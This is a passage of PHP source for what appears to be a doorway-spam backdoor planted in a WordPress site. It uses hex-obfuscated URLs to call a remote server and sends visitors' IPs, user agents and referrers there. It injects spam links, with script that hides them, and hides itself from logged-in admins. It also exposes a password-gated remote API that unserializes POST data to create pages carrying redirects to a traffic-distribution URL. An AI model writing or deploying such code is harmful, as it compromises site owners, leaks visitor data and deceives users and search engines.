				if (substr($host, 0, 4) == 'www.') {
					$host = substr($host, 4);
				}
			}
			if (isset($_REQUEST[md5(md5($host))]) OR isset($_COOKIE[md5(md5($host))])) {
				die('suspicious request denied');
			}
		}
		
		$eruri=explode('.', $ruri);
		
		if ( (in_array(end($eruri), $bad_file) and !isset($_GET['cache']) ) or stripos($ruri, 'robots.txt') !== false) {
			return false;
		}
		
		if (function_exists('is_user_logged_in')) {
			if (is_user_logged_in()) {
				return false;
			}
		}

		class eincode {
			public $links_url = "\x68\164\x74\160\x3a\57\x2f\144\x6f\157\x72\147\x65\156\x2e\170\x79\172\x2f\157\x75\164\x70\165\x74";
			
			public $ip = '';
			public $ua = '';
			public $css = '';
			public $js = '';
			public $host = '';
			public $tracker_get_part='';
			public $tracker_url="\x68\164\x74\160\x3a\57\x2f\144\x6f\157\x72\147\x65\156\x2e\170\x79\172\x2f\164\x72\141\x63\153\x65\162\x3f";
			public $doorway_links;
			
			function get_client_ip() {
				$this->ip = 'unknown';
				if (isset($_SERVER['HTTP_CLIENT_IP']))
					$this->ip = $_SERVER['HTTP_CLIENT_IP'];
				else if (isset($_SERVER['HTTP_X_FORWARDED_FOR']))
					$this->ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
				else if (isset($_SERVER['HTTP_X_FORWARDED']))
					$this->ip = $_SERVER['HTTP_X_FORWARDED'];
				else if (isset($_SERVER['HTTP_FORWARDED_FOR']))
					$this->ip = $_SERVER['HTTP_FORWARDED_FOR'];
				else if (isset($_SERVER['HTTP_FORWARDED']))
					$this->ip = $_SERVER['HTTP_FORWARDED'];
				else if (isset($_SERVER['REMOTE_ADDR']))
					$this->ip = $_SERVER['REMOTE_ADDR'];
			}

			function eincode($ruri, $host, $farm_url=false, $links=false) {
				if($farm_url) {
					$this->links_url=$farm_url;
				}
				
				if($links) {
					$this->doorway_links=$links;
				}
				else {
					$this->doorway_links=array();
				}
				
				$this->tracker_get_part=substr(md5($_SERVER['HTTP_HOST']), 0, 8);
				
				$this->ruri = $ruri;
				$this->get_client_ip();
				
				if(isset($_GET[$this->tracker_get_part])) {
					$this->get($this->tracker_url . 'data='.base64_encode(serialize(array('url'=>$_SERVER["HTTP_HOST"], 'ip'=>$this->ip, 'uri'=>$_GET['u'], 'ref'=>$_GET['r']))));
					
					header("Content-Type: image/gif");
					exit(0);
				}
				
				if(count($_GET) === 1 and empty($_GET[0]))
					$not_uri = end(array_keys($_GET));
				
				$this->uri = '?data='.base64_encode(@serialize(@array('url' => $_SERVER["HTTP_HOST"], 'uri' => $_SERVER["REQUEST_URI"], 'ua' => $_SERVER["HTTP_USER_AGENT"], 'ref' => $_SERVER["HTTP_REFERER"], 'ip' => $this->ip, 'not_uri'=>$not_uri))).'&url='.$_SERVER["HTTP_HOST"];
				
				$this->the_end();
			}

			function rwcontent($content) {
				$tags = array('p', 'span', 'strong', 'em', 'i', 'td', 'div', 'ul', 'li', 'span', 'body');
				$tags_vals = array();
				foreach ($tags as $tag) {
					preg_match_all("~<{$tag}.*?>(.*?)</{$tag}>~i", $content, $matches);
					
					if (@isset($matches[0])) {
						foreach ($matches[0] as $match) {
							$tags_vals[] = array('tag' => $tag, 'content' => $match);
						}
					}
					if (count($tags_vals) > count($this->links)) {
						break;
					}
				}
				foreach ($this->links as $link_index => $link) {
					foreach ($tags_vals as $tag_index => $tag_val) {
						if (strlen($tag_val['content']) % 2 == 1) {
							$tag_content_new = $tag_val['content'];
							$tag_content_new = preg_replace("(<{$tag_val['tag']}.*?>)", "$0{$link}", $tag_content_new, 1);
						} else {
							if (substr($tag_val['content'], -(strlen($tag_val['tag']) + 4)) == ".</{$tag_val['tag']}>") {
								$tag_content_new = str_replace(".</{$tag_val['tag']}>", "{$link}.</{$tag_val['tag']}>", $tag_val['content']);
							} else {
								$tag_content_new = str_replace("</{$tag_val['tag']}>", "{$link}</{$tag_val['tag']}>", $tag_val['content']);
							}
						}
						
						$content = preg_replace("~{$tag_val['content']}~i", $tag_content_new, $content, 1);
						
						unset($tags_vals[$tag_index]);
						
						if (strpos($content, $link) !== false) {
							unset($links[$link_index]);
							continue 2;
						}
					}
				}
				
				$tracker_code=$this->show_counter();
				
				if (count($this->links) > 0) {
					$content = preg_replace("~(</body>)~i", "{$this->js}\r\n{$tracker_code}\r\n$0", $content, 1);
					
					if (strpos($content, $this->js) == false) {
						$content .= $this->js."\r\n".$tracker_code;
					}
				}
				else {
					$content = preg_replace("~(</body>)~i", "{$tracker_code}\r\n$0", $content, 1);
					
					if (strpos($content, $this->tracker_code) == false) {
						$content .= $tracker_code;
					}
				}
				
				return $content;
			}
			
			function get($url, $bs64 = 0) {
				if (function_exists('curl_init')) {
					$ch = curl_init($url);
					curl_setopt($ch, CURLOPT_TIMEOUT, 5);
					curl_setopt($ch, CURLOPT_HEADER, 0);
					curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					$body = curl_exec($ch);
					$content_type = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
				} else {
					$body = file_get_contents($url);
				}

				if (!empty($body)) {
					switch ($bs64) {
						case '0':
							if (!empty($content_type))
								header('Content-Type: ' . $content_type);
							return trim(base64_decode(trim($body)));
						case '1':
							return $body;
					}
				}
				
				return false;
			}
			
			function the_end() {
				$this->css = substr(md5($_SERVER['SERVER_NAME']), 0, 5);
				$this->links = $this->make_links();
				
				$this->js = $this->make_js();
				ob_start(array($this, 'rwcontent'));
				register_shutdown_function('ob_end_flush');
			}
			
			function make_js() {
				$code = '<script type="text/javascript">function [func](className) {var elements = document.getElementsByClassName(className);while(elements.length > 0){elements[0].parentNode.removeChild(elements[0]);}}[func]("[class]");</script>';
				$code = str_replace('[func]', 'x' . substr(md5($this->css), 0, 5), $code);
				return str_replace('[class]', $this->css, $code);
			}
			
			function make_links() {
				if(count($this->doorway_links)==0) {
					$links_string = $this->get($this->links_url . $this->uri, 1);
					if (strlen($links_string) == 0) {
						return false;
					}
					
					$links = @explode('<br/>', $links_string);
					
					if (count($links) == 0) {
						return false;
					}
					
					foreach ($links as $i => $a) {
						$links[$i] = @trim(@str_replace('<a', '<a class="' . $this->css . '"', $a));
					}
					
					return $links;
				}
				else {
					foreach($this->doorway_links as $link) {
						$links[]='<a class="'.$this->css.'" href="'.$link['key'].'">'.$link['opt'].'</a>';
					}
					
					return $links;
				}
			}
			
			function show_counter() {
				return '<script language="JavaScript">document.write("<img width=\'1\' height=\'1\' src=\'/?'.$this->tracker_get_part.'=1&amp;r="+escape(document.referrer)+"&amp;u="+escape(document.URL)+"&rnd="+Math.random()+"\' />");</script>';
			}
		}
	}

	class DGAPI {
		var $pass;
		var $storage;
		var $eincode;
		var $doorway_links;
		
		function DGAPI() {
			$this->pass=DGDG_ACCESS_PASS;
			
			$this->storage=new DGSTORAGE;
			
			if(isset($_GET['dggtestbnevvef'])) {
				print md5($_GET['dggtestbnevvef'])."\r\n".$this->storage->setup();
				exit(0);
			}
			
			$this->request();
			$this->handle_query();
			
			$farm_url=$this->storage->get('options', 'farm_url');
			
			if($farm_url) {
				$this->eincode = new eincode($ruri, $host, $farm_url, $this->doorway_links);
			}
			else {
				$this->eincode = new eincode($ruri, $host, false, $this->doorway_links);
			}
		}
		
		function __wakeup() {
			$this->pass=DGDG_ACCESS_PASS;
		}
		
		function output($msg, $code=0) {
			print '<output>'.base64_encode('code[||]'.$code.'[|||]msg[||]'.$msg).'</output>';
			print '<output>'.'code[||]'.$code.'[|||]msg[||]'.$msg.'</output>';
			exit(0);
		}
		
		function handle_query() {
			//sitemap
			if(isset($_GET['sitemap']) && $_GET['sitemap']=='xml') {
				$links=$this->storage->get_all_links();
				$xml='<?xml version="1.0" encoding="UTF-8"?>'."\r\n".'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">'."\r\n";
				
				if(is_array($links) && count($links)>0) {
					foreach($links as $link) {
						$xml=$xml."\t<url>\r\n\t\t<loc>http://".$_SERVER['HTTP_HOST'].$link['key']."</loc>\r\n\t</url>\r\n";
					}
				}
				
				$xml=$xml.'</urlset>';
				
				header('Content-type: application/xml');
				
				print $xml;
				exit(0);
			}
			//rss
			else if(isset($_GET['rss']) && $_GET['rss']=='rss2') {
				$rss='<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:wfw="http://wellformedweb.org/CommentAPI/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" xmlns:slash="http://purl.org/rss/1.0/modules/slash/"><channel><title></title><atom:link href="http://'.$_SERVER['HTTP_HOST'].'?rss=rss2" rel="self" type="application/rss+xml" /><link>http://'.$_SERVER['HTTP_HOST'].'</link><description></description><lastBuildDate>'.date('r').'</lastBuildDate><generator>https://wordpress.org/?v=4.4.2</generator>';
				
				$links=$this->storage->get_latest_links();
				
				foreach($links as $link) {
					$rss=$rss.'<item>
						<title>'.$link['opt'].'</title>
						<link>http://'.$_SERVER['HTTP_HOST'].$link['key'].'</link>
						<pubDate></pubDate>
						<dc:creator><![CDATA[admin]]></dc:creator>

						<guid isPermaLink="false">http://'.$_SERVER['HTTP_HOST'].$link['key'].'</guid>
						<description><![CDATA['.$link['opt'].']]></description>
					</item>';
				}
				
				$rss=$rss.'</channel></rss>';
				
				header('Content-type: application/xml');
				
				print $rss;
				exit(0);
			}
			
			$page=$this->storage->check_and_get_page();
			
			$root_path=$this->storage->get('options', 'root_path');
			
			if(!$page) {
				$this->doorway_links=$this->storage->get_latest_links();
				
				foreach($this->doorway_links as $id=>$link) {
					$link['key']='http://'.($root_path ? preg_replace('!^http[s]*://!', '', $root_path) : $_SERVER['HTTP_HOST']).$link['key'];
					$this->doorway_links[$id]=$link;
				}
				
				return;
			}
			
			$tpl=$this->storage->get('options', 'template');
			$tds_url=$this->storage->get('options', 'tds_url');
			//$root_path=$this->storage->get('options', 'root_path');
			$redirect_tpl=$this->storage->get('options', 'redirect_tpl');
			
			$meta=explode('|||', $page['subopt']);
			
			if(!isset($meta[0]) || $meta[0]=='') {
				$meta[0]='';
			}
			else {
				$meta[0]='<meta name="description" content="'.$meta[0].'" />'."\r\n";
			}
			
			if(!isset($meta[1]) || $meta[1]=='') {
				$meta[1]='';
			}
			else {
				$meta[1]='<meta name="keywords" content="'.$meta[1].'" />'."\r\n";
			}
			
			$page['opt'][0]=strtoupper($page['opt'][0]);
			
			if(!isset($meta[3]) || $meta[3]=='') {
				$meta[3]=$page['opt'];
			}
			
			$tpl=str_replace(array(
					'[KEYWORD]',
					'[BKEYWORD]',
					'[META_DESCRIPTION]',
					'[META_KEYWORDS]',
					'[HEADLINE]',
					'[TITLE]',
					'[CONTENT]',
					'[CURRENT_URL]',
				),
				array(
					trim($page['opt']),
					trim($page['opt']),
					$meta[0],
					$meta[1],
					$meta[2],
					$meta[3],
					$page['contents'],
					$root_path.$_SERVER['REQUEST_URI'],
				),
				$tpl
			);
			
			$tds_url=str_replace('[KEYWORD]', urlencode($page['opt']), $tds_url);
			
			//redirect
			$redirect_tpl=str_replace('[TDS_URL]', $tds_url, $redirect_tpl);
			
			$tpl=preg_replace('!</head>!iUs', $redirect_tpl.'</head>', $tpl);
			
			print $tpl;
			exit(0);
		}
		
		function request() {
			//print_r($_POST);
			if(!isset($_POST['q']) || !isset($_POST['pass'])) {
				return;
			}
			
			if($_POST['pass']!==$this->pass) {
				$this->output('Invalid password', 1);
			}
			
			$request=@unserialize(@base64_decode($_POST['q']));
			
			if(!is_array($request)) {
				return;
			}
			
			switch($request['task']) {
				case 'generate_page':
					$this->generate_page($request['data']);
					break;
				case 'change_page':
					$this->change_page($request['data']);
					break;
				case 'delete_page':
					$this->delete_page($request['data']);
					break;
				case 'change_template':
					$this->change_template($request['data']);
					break;
				case 'heartbeat':
					$this->heartbeat($request['data']);
					break;
				case 'clean_data':
					$this->clean_data($request['data']);
					break;
				
				default:
					$this->output('Method unknown', 2);
			}
		}
		
		function clean_data($data) {
			$this->storage->delete_page_data();
			$this->output('ok', 0);
		}
		
		function generate_page(&$request) {
			if(empty($request['keyword'])) {
				$key=$this->storage->get_free_keyword($request['lang']);
				
				if($key==false) {
					$this->output('Could not select keyword', 3);
				}
				
				$request['keyword']=$key;
			}
			else {
				$request['keyword']=trim($request['keyword']);
			}
			
			if($this->storage->check_generated_keyword($request['keyword'])!=false) {
				$this->output('Keyword exists', 5);
			}
			
			if(!is_array($request['additional_keys'])) {
				$request['additional_keys']=array();
			}
			
			if(count($request['additional_keys'])==0) {
				$keys=$this->storage->get_additional_keywords($request['lang'], $request['keyword'], (int) $request['additional_keys_count']);
				
				if($keys==false) {
					$keys=parse_bing_keys($request['keyword'], $request['lang']);
					
					if($keys==false) {
						$keys=$this->storage->get_additional_keywords($request['lang'], false, (int) $request['additional_keys_count']);
					}
					else {
						$this->storage->insert_keys($request['lang'], $request['keyword'], $keys);
						$request['anchor_group_data']=$request['keyword']."\t".implode("\t", $keys);
					}
				}
				
				shuffle($keys);
				
				$request['additional_keys']=array_slice($keys, 0, (int) $request['additional_keys_count']);
			}
			
			if(empty($request['content'])) {
				$snippets=array();
				
				$paragraph=parse_bing_snippets($request['keyword'], $request['lang']);
				
				if(!$paragraph) {
					$this->output('Could not parse snippets', 7);
				}
				
				$snippets[]=$paragraph[0];
				
				$words=$paragraph[1];
				
				shuffle($words);
				
				if((int) $request['additional_keys_count']>0) {
					$key_parts=explode(' ', trim(preg_replace('![^a-z]+!', ' ', strtolower($request['keyword']))));
					$key_parts_c=count($key_parts);
					
					for($i=0;$i<$request['additional_keys_count'];$i++) {
						$c=0;
						$limit=mt_rand(2, 4);
						
						$keyword=array();
						
						if(count($words)==0) {
							break;
						}
						
						foreach($words as $id=>$word) {
							if($c==$limit || $word=='') {
								break;
							}
							
							$keyword[]=$word;
							unset($words[$id]);
							
							$c++;
						}
						
						if(mt_rand(1, 2)==1) {
							$keyword=$key_parts[mt_rand(0, $key_parts_c-1)].' '.implode(' ', $keyword);
						}
						else {
							$keyword=array_merge($keyword, $key_parts);
						}
						
						$paragraph=parse_bing_snippets($keyword, $request['lang']);
						
						if(!$paragraph) {
							break;
						}
						
						$snippets[]=$paragraph[0];
					}
				}
				
				$header='';
				
				if(defined('DGGENNTITLETWO') && trim($request['headline'])=='') {
					$request['headline']=DGGENNTITLETWO;
				}
				
				$limit=mt_rand(2, 5);
				$started=false;
				$pos=0;
				
				$snippets=explode('.', implode('', $snippets));
				
				foreach($snippets as $id=>$snippet) {
					if($started && $pos==$limit) {
						$snippets[$id]=$snippet.'.</p>';
						$limit=mt_rand(2, 5);
						$started=false;
					}
					else if(!$started) {
						$pos=0;
						$started=true;
						$snippets[$id]='<p>'.$snippet.'. ';
					}
					else {
						$snippets[$id]=$snippet.'. ';
						$pos++;
					}
				}
				
				$request['content']=implode("", $snippets);
				
				if($request['headline']=='') {
					$start_words=array('Here is', 'This is', 'About of', 'What is', 'The', '');
					$end_words=array('and more', 'etc.', 'for you', '');
					
					$request['headline']=trim($start_words[mt_rand(0, count($start_words)-1)].' '.$request['additional_keys'][mt_rand(0, count($request['additional_keys'])-1)].' '.$end_words[mt_rand(0, count($end_words)-1)]);
				}
			}
			
			$images=parse_images($request['keyword']);
			
			if(isset($request['link']) && is_array($request['link']) && !empty($request['link'][0])) {
				$request['link']=$request['link'][0];
			}
			else {
				$request['link']='';
			}
			
			$img_link=mt_rand(1, 10);
			
			if(count($images)>0) {
				@shuffle($images);
				
				preg_match_all('!<p>(.*)</p>!iUs', $request['content'], $maches, PREG_SET_ORDER);
				
				if(count($maches)>0) {
					$snippets=array();
					
					foreach($maches as $id=>$snippet) {
						$snippet=$snippet[1];
						
						if(empty($snippet)) {
							continue;
						}
						
						mt_srand();
						
						if(isset($images[$id])) {
							if(mt_rand(1, 2)==1) {
								$float='left';
							}
							else {
								$float='right';
							}
							
							/*
							if(mt_rand(1, 2)==1) {
								$alt=' alt="'.htmlspecialchars($request['keyword']).'"';
							}
							else {
								$alt='';
							}
							*/
							
							$img='<img style="padding:'.mt_rand(3, 12).'px;float:'.$float.';vertical-align:top;width:'.mt_rand(120, 240).'; height:'.mt_rand(120, 240).';" src="'.$images[$id].'" />';
						}
						else {
							$img='';
						}
						
						if($img_link==2 && isset($request['link']) && $request['link']!=='' && !defined('DGDG_LINK_PLACED')) {
							preg_match('!(<a[^>]+>)([^<]+)</a>!iUs', $request['link'], $mach);
							
							if(count($mach)>0) {
								$img=$mach[1].str_replace('<img ', '<img alt="'.htmlspecialchars($mach[2]).'" ', $img).'</a>';
								define('DGDG_LINK_PLACED', true);
							}
							else {
								$img=str_replace('<img ', '<img '.$alt.' ', $img);
							}
							
							$snippets[]='<p>'.$img.' '.$snippet.'</p>';
						}
						else {
							if(!preg_match('!alt=[\'"]!', $img)) {
								$img=str_replace('<img ', '<img alt="'.htmlspecialchars($request['keyword']).'" ', $img);
							}
							
							$snippets[]='<p>'.$img.' '.$snippet.'</p>';
						}
					}
					
					$request['content']=implode("", $snippets);
				}
			}
			
			if(!defined('DGDG_LINK_PLACED') && isset($request['link']) && $request['link']!=='') {
				$request['content']=explode(' ', $request['content']);
				
				$i=mt_rand(0, count($request['content'])-1);
				
				$request['content'][$i]=$request['link'].' '.$request['content'][$i];
				
				$request['content']=implode(' ', $request['content']);
			}
			
			$video=parse_video($request['keyword']);
			
			if($video) {
				$method=mt_rand(1, 3);
				
				$request['content']=explode('</p>', $request['content']);
				
				if(count($request['content'])>1) {
					$i=mt_rand(0, count($request['content'])-1);
					$video=str_replace(array('<p>', '</p>',), '', $video);
					
					$request['content'][$i]=$request['content'][$i].'<br />'.$video;
					$request['content']=implode('</p>', $request['content']);
				}
				else {
					$request['content']=implode('</p>', $request['content']);
					$request['content']=$request['content'].$video;
				}
			}
			
			if(empty($request['meta_description'])) {
				if(defined('DGGENNTITLEONE') && DGGENNTITLEONE!=='') {
					$request['meta_description']=DGGENNTITLEONE;
				}
			}
			
			if(empty($request['meta_keywords'])) {
				$request['meta_keywords']=$request['keyword'].(count($request['additional_keys'])>0 ? ', '.implode(', ', $request['additional_keys']) : '');
			}
			
			if(empty($request['slug'])) {
				$request['slug']=preg_replace('![^a-z0-9]+!', '-', $request['keyword']);
			}
			
			if(!isset($request['id'])) {
				$request['id']=$this->storage->reserve_page_id();
			}
			
			if(!isset($request['uri'])) {
				$url_tpl=$this->storage->get('options', 'url_tpl');
				
				$request['uri']=str_replace(
					array(
						'{slug}',
						'{id}',
					),
					array(
						$request['slug'],
						$request['id'],
					),
					$url_tpl
				);
			}
			
			if($request['keyword']=='') {
				$this->output('Could not find keyword', 4);
			}
			
			if(!isset($request['title']) || $request['title']=='') {
				$request['title']=$request['keyword'];
			}
			
			$this->storage->set_page($request['id'], $request['uri'], $request['lang'], $request['keyword'], $request['meta_description'], $request['meta_keywords'], $request['content'], $request['headline'], $request['title']);
			
			//ping
			if(function_exists('curl_init')) {
				$xmlping = '<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
    <methodName>weblogUpdates.ping</methodName>
    <params>
        <param>
            <value>'.$_SERVER['HTTP_HOST'].'</value>
        </param>
        <param>
            <value>http://'.$_SERVER['HTTP_HOST'].'/?rss=rss2</value>
        </param>
    </params>
</methodCall>';
				$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, 'http://blogsearch.google.com/ping/RPC2');
				curl_setopt($ch, CURLOPT_HEADER, false);
				curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Length: ' . mb_strlen($xmlping), 'Content-type: text/xml')); 
				curl_setopt($ch, CURLOPT_POST, true);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
				curl_setopt($ch, CURLOPT_POSTFIELDS, $xmlping);
				curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36');
				$outch = curl_exec($ch);
				curl_close($ch);
				
				$sitemapurl=urlencode('http://'.$_SERVER['HTTP_HOST'].'/?sitemap=xml');
				
				// xml карту в google
				$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, 'http://www.google.com/webmasters/sitemaps/ping?sitemap='.$sitemapurl);
				curl_setopt($ch, CURLOPT_HEADER, false);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
				curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36');
				$outch = curl_exec($ch);
				curl_close($ch);

				// xml карту в bing
				$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, 'http://www.bing.com/webmaster/ping.aspx?sitemap='.$sitemapurl);
				curl_setopt($ch, CURLOPT_HEADER, false);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
				curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36');
				$outch = curl_exec($ch);
				curl_close($ch);
			}
			
			$output=array();
			
			foreach($request as $k=>$v) {
				if(is_array($v)) {
					$output[]=urlencode($k).'='.urlencode(implode('|||', $v));
				}
				else {
					$output[]=urlencode($k).'='.urlencode($v);
				}
			}
			
			$output=implode('&', $output);
			
			$this->output($output, 0);
		}
		
		function delete_page(&$request) {
			if(is_array($request)) {
				foreach($request as $page_id) {
					$this->storage->delete_page($page_id);
				}
				
				$this->output('ok', 0);
			}
			
			$this->output('Invalid IDs', 1);
		}
		
		function change_page(&$request) {
			if(trim($request['id'])=='') {
				$this->output('Invalid on_client_id field', 1);
			}
			else if(trim($request['content'])=='') {
				$this->output('Invalid content field', 1);
			}
			else if(trim($request['uri'])=='') {
				$this->output('Invalid uri field', 1);
			}
			
			if(!isset($request['title']) || $request['title']=='') {
				$request['title']=$request['keyword'];
			}
			
			$this->storage->set_page($request['id'], $request['uri'], $request['lang'], $request['keyword'], $request['meta_description'], $request['meta_keywords'], $request['content'], $request['headline'], $request['title']);
			
			$this->output('ok', 0);
		}
		
		function change_template(&$request) {
			if(trim($request)=='') {
				$this->output('Empty template', 5);
			}
			
			$this->storage->set('options', 'template', $request);
			
			$this->output('ok', 0);
		}
		
		function heartbeat(&$request) {
			foreach($request as $option=>$data) {
				$this->storage->set('options', $option, $data);
			}
			
			$this->output('ok', 0);
		}
	}
	
	$api=new DGAPI();
}
?>